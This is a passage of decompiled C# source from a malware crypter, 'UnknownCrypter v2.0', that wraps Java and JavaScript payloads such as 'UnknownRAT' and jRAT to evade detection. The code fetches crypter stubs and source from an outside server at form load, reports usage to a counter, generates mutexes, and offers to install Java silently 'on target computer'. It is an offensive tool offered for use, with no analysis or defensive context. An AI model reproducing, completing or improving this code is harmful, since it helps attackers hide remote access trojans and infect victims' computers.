			TabPage2.Controls.Add(RedemptionLabel8);
			point2 = (TabPage2.Location = new System.Drawing.Point(104, 4));
			padding2 = (TabPage2.Margin = new System.Windows.Forms.Padding(4));
			TabPage2.Name = "TabPage2";
			padding2 = (TabPage2.Padding = new System.Windows.Forms.Padding(4));
			size2 = (TabPage2.Size = new System.Drawing.Size(490, 354));
			TabPage2.TabIndex = 1;
			TabPage2.Text = "Java";
			cmbPayload.BackColor = System.Drawing.Color.Transparent;
			cmbPayload.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
			cmbPayload.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
			cmbPayload.Font = new System.Drawing.Font("Arial", 8.25f, System.Drawing.FontStyle.Bold);
			cmbPayload.ForeColor = System.Drawing.Color.FromArgb(182, 179, 171);
			cmbPayload.FormattingEnabled = true;
			cmbPayload.ItemHeight = 18;
			cmbPayload.Items.AddRange(new object[2] { "UnknownRAT", "jRAT & Others" });
			point2 = (cmbPayload.Location = new System.Drawing.Point(225, 112));
			padding2 = (cmbPayload.Margin = new System.Windows.Forms.Padding(4));
			cmbPayload.Name = "cmbPayload";
			size2 = (cmbPayload.Size = new System.Drawing.Size(212, 24));
			cmbPayload.TabIndex = 34;
			RedemptionLabel9.BackColor = System.Drawing.Color.Transparent;
			RedemptionLabel9.Font = new System.Drawing.Font("Arial", 8.25f, System.Drawing.FontStyle.Bold);
			RedemptionLabel9.ForeColor = System.Drawing.Color.White;
			point2 = (RedemptionLabel9.Location = new System.Drawing.Point(225, 73));
			padding2 = (RedemptionLabel9.Margin = new System.Windows.Forms.Padding(4));
			RedemptionLabel9.Name = "RedemptionLabel9";
			size2 = (RedemptionLabel9.Size = new System.Drawing.Size(100, 28));
			RedemptionLabel9.TabIndex = 33;
			RedemptionLabel9.Text = "PayloadType";
			txtOutputFileName2.Cursor = System.Windows.Forms.Cursors.IBeam;
			txtOutputFileName2.Enabled = false;
			txtOutputFileName2.Font = new System.Drawing.Font("Arial", 9f);
			txtOutputFileName2.ForeColor = System.Drawing.Color.DimGray;
			txtOutputFileName2.Image_0 = null;
			point2 = (txtOutputFileName2.Location = new System.Drawing.Point(10, 255));
			txtOutputFileName2.Int32_0 = 32767;
			txtOutputFileName2.Name = "txtOutputFileName2";
			txtOutputFileName2.Boolean_0 = false;
			size2 = (txtOutputFileName2.Size = new System.Drawing.Size(371, 30));
			txtOutputFileName2.TabIndex = 32;
			txtOutputFileName2.HorizontalAlignment_0 = System.Windows.Forms.HorizontalAlignment.Left;
			txtOutputFileName2.Boolean_1 = false;
			txtFileName2.Cursor = System.Windows.Forms.Cursors.IBeam;
			txtFileName2.Enabled = false;
			txtFileName2.Font = new System.Drawing.Font("Arial", 9f);
			txtFileName2.ForeColor = System.Drawing.Color.DimGray;
			txtFileName2.Image_0 = null;
			point2 = (txtFileName2.Location = new System.Drawing.Point(12, 36));
			txtFileName2.Int32_0 = 32767;
			txtFileName2.Name = "txtFileName2";
			txtFileName2.Boolean_0 = false;
			size2 = (txtFileName2.Size = new System.Drawing.Size(369, 30));
			txtFileName2.TabIndex = 31;
			txtFileName2.HorizontalAlignment_0 = System.Windows.Forms.HorizontalAlignment.Left;
			txtFileName2.Boolean_1 = false;
			progressBar2.BackColor = System.Drawing.Color.Transparent;
			progressBar2.Color_3 = System.Drawing.Color.FromArgb(45, 45, 48);
			progressBar2.Color_0 = System.Drawing.Color.FromArgb(28, 28, 28);
			point2 = (progressBar2.Location = new System.Drawing.Point(331, 149));
			padding2 = (progressBar2.Margin = new System.Windows.Forms.Padding(4));
			progressBar2.Int32_0 = 100;
			progressBar2.Name = "progressBar2";
			progressBar2.Color_2 = System.Drawing.Color.FromArgb(62, 62, 66);
			progressBar2.Int32_3 = 255;
			size2 = (progressBar2.Size = new System.Drawing.Size(104, 104));
			progressBar2.Int32_2 = 110;
			progressBar2.TabIndex = 30;
			progressBar2.Color_1 = System.Drawing.Color.FromArgb(153, 153, 153);
			progressBar2.Int32_1 = 0;
			chkInstallJre.BackColor = System.Drawing.Color.Transparent;
			chkInstallJre.Boolean_4 = false;
			chkInstallJre.Struct0_0 = new Struct0[0];
			chkInstallJre.String_0 = "";
			chkInstallJre.Font = new System.Drawing.Font("Verdana", 8f);
			chkInstallJre.Image_0 = null;
			point2 = (chkInstallJre.Location = new System.Drawing.Point(169, 223));
			padding2 = (chkInstallJre.Margin = new System.Windows.Forms.Padding(4));
			chkInstallJre.Name = "chkInstallJre";
			chkInstallJre.Boolean_0 = false;
			size2 = (chkInstallJre.Size = new System.Drawing.Size(152, 15));
			chkInstallJre.TabIndex = 29;
			chkInstallJre.Text = "Auto Install JRE";
			chkInstallJre.Boolean_1 = true;
			btnCryptJava.BackColor = System.Drawing.Color.Transparent;
			btnCryptJava.Struct0_0 = new Struct0[0];
			btnCryptJava.String_0 = "";
			btnCryptJava.Font = new System.Drawing.Font("Verdana", 10f, System.Drawing.FontStyle.Bold);
			btnCryptJava.Image_0 = null;
			point2 = (btnCryptJava.Location = new System.Drawing.Point(121, 293));
			padding2 = (btnCryptJava.Margin = new System.Windows.Forms.Padding(4));
			btnCryptJava.Name = "btnCryptJava";
			btnCryptJava.Boolean_0 = false;
			size2 = (btnCryptJava.Size = new System.Drawing.Size(202, 51));
			btnCryptJava.TabIndex = 28;
			btnCryptJava.Text = "CRYPT";
			btnCryptJava.Boolean_1 = true;
			btnSave2.BackColor = System.Drawing.Color.Transparent;
			btnSave2.Struct0_0 = new Struct0[0];
			btnSave2.String_0 = "";
			btnSave2.Font = new System.Drawing.Font("Verdana", 8f);
			btnSave2.Image_0 = null;
			point2 = (btnSave2.Location = new System.Drawing.Point(387, 256));
			padding2 = (btnSave2.Margin = new System.Windows.Forms.Padding(4));
			btnSave2.Name = "btnSave2";
			btnSave2.Boolean_0 = false;
			size2 = (btnSave2.Size = new System.Drawing.Size(49, 28));
			btnSave2.TabIndex = 27;
			btnSave2.Text = "...";
			btnSave2.Boolean_1 = true;
			btnGenerateMutex2.BackColor = System.Drawing.Color.Transparent;
			btnGenerateMutex2.Struct0_0 = new Struct0[0];
			btnGenerateMutex2.String_0 = "";
			btnGenerateMutex2.Font = new System.Drawing.Font("Verdana", 8f);
			btnGenerateMutex2.Image_0 = null;
			point2 = (btnGenerateMutex2.Location = new System.Drawing.Point(116, 110));
			padding2 = (btnGenerateMutex2.Margin = new System.Windows.Forms.Padding(4));
			btnGenerateMutex2.Name = "btnGenerateMutex2";
			btnGenerateMutex2.Boolean_0 = false;
			size2 = (btnGenerateMutex2.Size = new System.Drawing.Size(101, 28));
			btnGenerateMutex2.TabIndex = 26;
			btnGenerateMutex2.Text = "Generate";
			btnGenerateMutex2.Boolean_1 = true;
			btnBrowse2.BackColor = System.Drawing.Color.Transparent;
			btnBrowse2.Struct0_0 = new Struct0[0];
			btnBrowse2.String_0 = "";
			btnBrowse2.Font = new System.Drawing.Font("Verdana", 8f);
			btnBrowse2.Image_0 = null;
			point2 = (btnBrowse2.Location = new System.Drawing.Point(388, 38));
			padding2 = (btnBrowse2.Margin = new System.Windows.Forms.Padding(4));
			btnBrowse2.Name = "btnBrowse2";
			btnBrowse2.Boolean_0 = false;
			size2 = (btnBrowse2.Size = new System.Drawing.Size(49, 28));
			btnBrowse2.TabIndex = 25;
			btnBrowse2.Text = "...";
			btnBrowse2.Boolean_1 = true;
			RedemptionLabel5.BackColor = System.Drawing.Color.Transparent;
			RedemptionLabel5.Font = new System.Drawing.Font("Arial", 8.25f, System.Drawing.FontStyle.Bold);
			RedemptionLabel5.ForeColor = System.Drawing.Color.White;
			point2 = (RedemptionLabel5.Location = new System.Drawing.Point(11, 219));
			padding2 = (RedemptionLabel5.Margin = new System.Windows.Forms.Padding(4));
			RedemptionLabel5.Name = "RedemptionLabel5";
			size2 = (RedemptionLabel5.Size = new System.Drawing.Size(100, 28));
			RedemptionLabel5.TabIndex = 23;
			RedemptionLabel5.Text = "Save File";
			cmbExtension2.BackColor = System.Drawing.Color.Transparent;
			cmbExtension2.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
			cmbExtension2.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
			cmbExtension2.Font = new System.Drawing.Font("Arial", 8.25f, System.Drawing.FontStyle.Bold);
			cmbExtension2.ForeColor = System.Drawing.Color.FromArgb(182, 179, 171);
			cmbExtension2.FormattingEnabled = true;
			cmbExtension2.ItemHeight = 18;
			cmbExtension2.Items.AddRange(new object[2] { "Java File (*.jar)", "JavaScript File (*.js)" });
			point2 = (cmbExtension2.Location = new System.Drawing.Point(8, 182));
			padding2 = (cmbExtension2.Margin = new System.Windows.Forms.Padding(4));
			cmbExtension2.Name = "cmbExtension2";
			size2 = (cmbExtension2.Size = new System.Drawing.Size(315, 24));
			cmbExtension2.TabIndex = 22;
			RedemptionLabel6.BackColor = System.Drawing.Color.Transparent;
			RedemptionLabel6.Font = new System.Drawing.Font("Arial", 8.25f, System.Drawing.FontStyle.Bold);
			RedemptionLabel6.ForeColor = System.Drawing.Color.White;
			point2 = (RedemptionLabel6.Location = new System.Drawing.Point(8, 146));
			padding2 = (RedemptionLabel6.Margin = new System.Windows.Forms.Padding(4));
			RedemptionLabel6.Name = "RedemptionLabel6";
			size2 = (RedemptionLabel6.Size = new System.Drawing.Size(157, 28));
			RedemptionLabel6.TabIndex = 21;
			RedemptionLabel6.Text = "Output Extension";
			txtMutex2.BackColor = System.Drawing.Color.Transparent;
			txtMutex2.Enabled = false;
			txtMutex2.Font = new System.Drawing.Font("Arial", 8.25f, System.Drawing.FontStyle.Bold);
			txtMutex2.ForeColor = System.Drawing.Color.White;
			point2 = (txtMutex2.Location = new System.Drawing.Point(8, 110));
			padding2 = (txtMutex2.Margin = new System.Windows.Forms.Padding(4));
			txtMutex2.Int32_0 = 32767;
			txtMutex2.Boolean_1 = false;
			txtMutex2.Name = "txtMutex2";
			size2 = (txtMutex2.Size = new System.Drawing.Size(100, 30));
			txtMutex2.TabIndex = 20;
			txtMutex2.HorizontalAlignment_0 = System.Windows.Forms.HorizontalAlignment.Left;
			txtMutex2.Boolean_0 = false;
			RedemptionLabel7.BackColor = System.Drawing.Color.Transparent;
			RedemptionLabel7.Font = new System.Drawing.Font("Arial", 8.25f, System.Drawing.FontStyle.Bold);
			RedemptionLabel7.ForeColor = System.Drawing.Color.White;
			point2 = (RedemptionLabel7.Location = new System.Drawing.Point(8, 74));
			padding2 = (RedemptionLabel7.Margin = new System.Windows.Forms.Padding(4));
			RedemptionLabel7.Name = "RedemptionLabel7";
			size2 = (RedemptionLabel7.Size = new System.Drawing.Size(100, 28));
			RedemptionLabel7.TabIndex = 19;
			RedemptionLabel7.Text = "Mutex";
			RedemptionLabel8.BackColor = System.Drawing.Color.Transparent;
			RedemptionLabel8.Font = new System.Drawing.Font("Arial", 8.25f, System.Drawing.FontStyle.Bold);
			RedemptionLabel8.ForeColor = System.Drawing.Color.White;
			point2 = (RedemptionLabel8.Location = new System.Drawing.Point(11, 6));
			padding2 = (RedemptionLabel8.Margin = new System.Windows.Forms.Padding(4));
			RedemptionLabel8.Name = "RedemptionLabel8";
			size2 = (RedemptionLabel8.Size = new System.Drawing.Size(100, 28));
			RedemptionLabel8.TabIndex = 18;
			RedemptionLabel8.Text = "Select File";
			System.Drawing.SizeF sizeF2 = (AutoScaleDimensions = new System.Drawing.SizeF(8f, 16f));
			AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			size2 = (ClientSize = new System.Drawing.Size(606, 394));
			Controls.Add(BlackShadesNetForm1);
			FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			padding2 = (Margin = new System.Windows.Forms.Padding(4));
			Name = "Form3";
			Text = "UnknownCrypter v2.0";
			TransparencyKey = System.Drawing.Color.Fuchsia;
			BlackShadesNetForm1.ResumeLayout(false);
			RedemptionTabControl1.ResumeLayout(false);
			TabPage1.ResumeLayout(false);
			TabPage2.ResumeLayout(false);
			ResumeLayout(false);
		}

		private void method_0(int int_0)
		{
			if (InvokeRequired)
			{
				try
				{
					WebClient webClient = new WebClient();
					webClient.DownloadString("http://kingmummylive.com/server/count.php?u=" + Form1.string_0);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				Invoke(new GDelegate2(method_0), int_0);
			}
			else if (int_0 == 1)
			{
				btnCryptJS.Enabled = true;
			}
			else
			{
				btnCryptJava.Enabled = true;
			}
		}

		private void method_1(string string_5)
		{
			if (InvokeRequired)
			{
				Invoke(new GDelegate0(method_1), string_5);
			}
			else
			{
				MessageBox.Show(string_5);
				btnCryptJS.Enabled = true;
				btnCryptJava.Enabled = true;
			}
		}

		private void method_2(int[] int_0)
		{
			if (InvokeRequired)
			{
				Invoke(new GDelegate1(method_2), int_0);
			}
			else if (int_0[0] == 1)
			{
				progressBar1.Int32_1 = int_0[1];
			}
			else
			{
				progressBar2.Int32_1 = int_0[1];
			}
		}

		private void Form3_FormClosing(object sender, FormClosingEventArgs e)
		{
			Class1.MyForms_0.Form1_0.WindowState = FormWindowState.Normal;
			Class1.MyForms_0.Form1_0.ShowInTaskbar = true;
		}

		private void btnBrowse1_Click(object sender, EventArgs e)
		{
			OpenFileDialog_0.Filter = "JavaScript Files|*.js";
			OpenFileDialog_0.Title = "Select a file";
			OpenFileDialog_0.FileName = "";
			DialogResult dialogResult = OpenFileDialog_0.ShowDialog();
			if (dialogResult == DialogResult.OK)
			{
				txtFileName1.Text = OpenFileDialog_0.FileName;
			}
		}

		private void btnBrowse2_Click(object sender, EventArgs e)
		{
			OpenFileDialog_0.Filter = "Java Files|*.jar";
			OpenFileDialog_0.Title = "Select a file";
			OpenFileDialog_0.FileName = "";
			DialogResult dialogResult = OpenFileDialog_0.ShowDialog();
			if (dialogResult == DialogResult.OK)
			{
				txtFileName2.Text = OpenFileDialog_0.FileName;
			}
		}

		private void btnSave1_Click(object sender, EventArgs e)
		{
			SaveFileDialog_0.Filter = "JavaScript Files|*.js";
			SaveFileDialog_0.Title = "Save As";
			SaveFileDialog_0.AddExtension = true;
			SaveFileDialog_0.CheckFileExists = false;
			SaveFileDialog_0.OverwritePrompt = true;
			SaveFileDialog_0.FileName = "";
			DialogResult dialogResult = SaveFileDialog_0.ShowDialog();
			if (dialogResult == DialogResult.OK)
			{
				txtOutputFileName1.Text = SaveFileDialog_0.FileName;
			}
		}

		private void btnSave2_Click(object sender, EventArgs e)
		{
			SaveFileDialog_0.Filter = "Java Files|*.jar|JavaScript Files|*.js";
			SaveFileDialog_0.Title = "Save As";
			SaveFileDialog_0.CheckFileExists = false;
			SaveFileDialog_0.FileName = "";
			DialogResult dialogResult = SaveFileDialog_0.ShowDialog();
			if (dialogResult == DialogResult.OK)
			{
				txtOutputFileName2.Text = SaveFileDialog_0.FileName;
			}
		}

		private void cmbExtension2_SelectedIndexChanged(object sender, EventArgs e)
		{
			if (cmbExtension2.SelectedIndex == 0)
			{
				if (!txtOutputFileName2.Text.EndsWith(".jar"))
				{
					txtOutputFileName2.Text += ".jar";
				}
			}
			else if (!txtOutputFileName2.Text.EndsWith(".js"))
			{
				txtOutputFileName2.Text += ".js";
			}
		}

		private void cmbExtension1_SelectedIndexChanged(object sender, EventArgs e)
		{
			if ((cmbExtension1.SelectedIndex == 0) & !txtOutputFileName1.Text.EndsWith(".js"))
			{
				txtOutputFileName1.Text += ".js";
			}
		}

		private string method_3(int int_0)
		{
			string text = "<>!@#-%_&";
			if (int_0 > 8)
			{
				return "";
			}
			Random random = new Random();
			string text2 = "";
			checked
			{
				int num = int_0 - 1;
				int num2 = 0;
				while (true)
				{
					int num3 = num2;
					int num4 = num;
					if (num3 > num4)
					{
						break;
					}
					int num5 = random.Next(1, 8);
					text2 += text.Substring(num5 - 1, 1);
					num2++;
				}
				return text2;
			}
		}

		private void btnGenerateMutex1_Click(object sender, EventArgs e)
		{
			txtMutex1.Text = method_3(3);
		}

		private void btnGenerateMutex2_Click(object sender, EventArgs e)
		{
			txtMutex2.Text = method_3(3);
		}

		private void Form3_Load(object sender, EventArgs e)
		{
			try
			{
				WebClient webClient = new WebClient();
				string_0 = webClient.DownloadString("http://kingmummylive.com/server/getfile.php?id=jsbin&u=" + Form1.string_0 + "&s=" + Form1.string_2);
				string_1 = webClient.DownloadString("http://kingmummylive.com/server/getfile.php?id=jsjbin&u=" + Form1.string_0 + "&s=" + Form1.string_2);
				string_3 = webClient.DownloadString("http://kingmummylive.com/server/getfile.php?id=jsbdbin&u=" + Form1.string_0 + "&s=" + Form1.string_2);
				string_4 = webClient.DownloadString("http://kingmummylive.com/server/getfile.php?id=jsource&u=" + Form1.string_0 + "&s=" + Form1.string_2);
				if (string_0.StartsWith("$"))
				{
					string_0 = string_0.Substring(1);
				}
				else
				{
					string_0 = null;
				}
				if (string_1.StartsWith("$"))
				{
					string_1 = string_1.Substring(1);
				}
				else
				{
					string_1 = null;
				}
				if (string_3.StartsWith("$"))
				{
					string_3 = string_3.Substring(1);
				}
				else
				{
					string_3 = null;
				}
				if (string_4.StartsWith("$"))
				{
					string_4 = string_4.Substring(1);
				}
				else
				{
					string_4 = null;
				}
				if ((Operators.CompareString(string_0, null, TextCompare: false) == 0) | (Operators.CompareString(string_1, null, TextCompare: false) == 0) | (Operators.CompareString(string_3, null, TextCompare: false) == 0) | (Operators.CompareString(string_4, null, TextCompare: false) == 0))
				{
					MessageBox.Show("Fatal error, cannot proceed, check network settings");
					Close();
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				MessageBox.Show("Fatal error, cannot proceed", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				Close();
				ProjectData.ClearProjectError();
			}
		}

		private void btnCryptJS_Click(object sender, EventArgs e)
		{
			if (!bool_0)
			{
				MessageBox.Show("Your license only allow you to crypt Java Files ONLY. Upgrade to full license to use both Jar & Js feature", "Limited License", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
				return;
			}
			string text = txtFileName1.Text;
			string text2 = txtMutex1.Text;
			string left = cmbExtension1.Text;
			if (Operators.CompareString(text, "", TextCompare: false) == 0)
			{
				MessageBox.Show("File selected is invalid.");
				return;
			}
			if (Operators.CompareString(text2, "", TextCompare: false) == 0)
			{
				MessageBox.Show("Mutex is invalid. Pls generate a valid one");
				return;
			}
			if (Operators.CompareString(left, "", TextCompare: false) == 0)
			{
				MessageBox.Show("Please select a valid output extension.");
				return;
			}
			if ((Operators.CompareString(txtOutputFileName1.Text, "", TextCompare: false) == 0) | (Operators.CompareString(txtOutputFileName1.Text, ".js", TextCompare: false) == 0))
			{
				MessageBox.Show("Please select a valid output directory to save.");
				return;
			}
			btnCryptJS.Enabled = false;
			if (text.ToLower().EndsWith(".js"))
			{
				GClass2 gClass = new GClass2(text, txtOutputFileName1.Text, text2, method_1, method_2, method_0);
				gClass.method_0();
			}
		}

		private void btnCryptJava_Click(object sender, EventArgs e)
		{
			string text = txtFileName2.Text;
			string text2 = txtMutex2.Text;
			string left = cmbExtension2.Text;
			string left2 = cmbPayload.Text;
			if (Operators.CompareString(text, "", TextCompare: false) == 0)
			{
				MessageBox.Show("File selected is invalid.");
				return;
			}
			if (Operators.CompareString(text2, "", TextCompare: false) == 0)
			{
				MessageBox.Show("Mutex is invalid. Pls generate a valid one");
				return;
			}
			if (Operators.CompareString(left, "", TextCompare: false) == 0)
			{
				MessageBox.Show("Please select a valid output extension.");
				return;
			}
			if (Operators.CompareString(left2, "", TextCompare: false) == 0)
			{
				MessageBox.Show("Please select a valid payload type.");
				return;
			}
			if ((Operators.CompareString(txtOutputFileName2.Text, "", TextCompare: false) == 0) | (Operators.CompareString(txtOutputFileName2.Text, ".js", TextCompare: false) == 0) | (Operators.CompareString(txtOutputFileName2.Text, ".jar", TextCompare: false) == 0))
			{
				MessageBox.Show("Please select a valid output directory to save.");
				return;
			}
			if (cmbPayload.SelectedIndex == 0)
			{
				bool_1 = true;
			}
			else
			{
				bool_1 = false;
			}
			btnCryptJava.Enabled = false;
			string text3 = txtOutputFileName2.Text;
			if (text3.EndsWith(".js") & chkInstallJre.Boolean_4)
			{
				MessageBox.Show("You have enabled Auto Java Installation.\r\nJRE will silently be installed on target computer if it does not already exist");
			}
			if (text.ToLower().EndsWith(".jar"))
			{
				GClass1 gClass = new GClass1(text, text3, text2, method_1, method_2, method_0, null, null, null);
				gClass.method_0();
			}
		}

		private void cmbPayload_SelectedIndexChanged(object sender, EventArgs e)
		{
			if (cmbPayload.SelectedIndex == 0)
			{
				txtFileName2.Enabled = false;
				btnBrowse2.Visible = true;
				RedemptionLabel8.Text = "Select File";
			}
			else
			{
				txtFileName2.Enabled = true;
				btnBrowse2.Visible = false;
				RedemptionLabel8.Text = "Jar File URL";
			}
		}
	}
}
